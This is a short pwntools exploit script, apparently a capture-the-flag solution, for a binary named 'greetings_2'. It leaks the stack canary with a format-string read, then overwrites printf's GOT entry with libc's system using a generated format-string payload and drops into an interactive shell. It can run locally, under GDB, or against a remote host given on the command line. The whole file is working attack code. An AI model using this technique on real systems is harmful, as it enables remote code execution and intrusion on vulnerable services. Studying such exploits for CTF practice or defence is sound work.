#!/usr/bin/env python3

from pwn import *
import io

exe = './greetings_2'
elf = context.binary = ELF(exe, checksec=False)
## If we need libc
# libc = ELF("./libc.so.6", checksec=False)
context(os='linux', arch='amd64')
context.log_level = 'debug'
libc = elf.libc
libc.address = 0x00007ffff7dcb000


def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# specify GDB script here (breakpoints etc
gdbscript = '''
continue
'''.format(**locals())

offset = 280
pop_rdi = 0x00000000004014a3
ret_gadget = 0x000000000040101a


## We get canary and try to get libc from static binary
## But we don't need it since we exploit puts vulnerability

## We do exploit Canary whoever
def exploit(p):
    ## GETTING Canary
    p.sendlineafter(b'Name: ', 'Canary')
    p.sendline('%{}$p'.format(49).encode())
    # Receive the response
    for _ in range(4):
        p.recvline()

    result = p.recvline().decode()
    canary = int(result.split(',')[1], 16)
    info('canary = 0x%x (%d)', canary, canary)
    info('elf put = 0x%x', elf.got.puts)
    info('libc.sym  = 0x%x', libc.sym['system'])
    info('elf put = 0x%x', elf.got.puts)
    info('elf got printf = 0x%x', elf.got.printf)

    p.sendline('y')
    p.recvline().strip(b"\n")

    p.sendlineafter(b'Name: ', 'Puts')
    ## Actual payload as we exploit a printf vulnerability
    payload_fmt = fmtstr_payload(14, {elf.got['printf']: libc.sym['system']})
    p.sendline(payload_fmt)
    p.sendline('y')

    p.clean()

    p.interactive()


def main():
    p = conn()
    exploit(p)


if __name__ == "__main__":
    main()
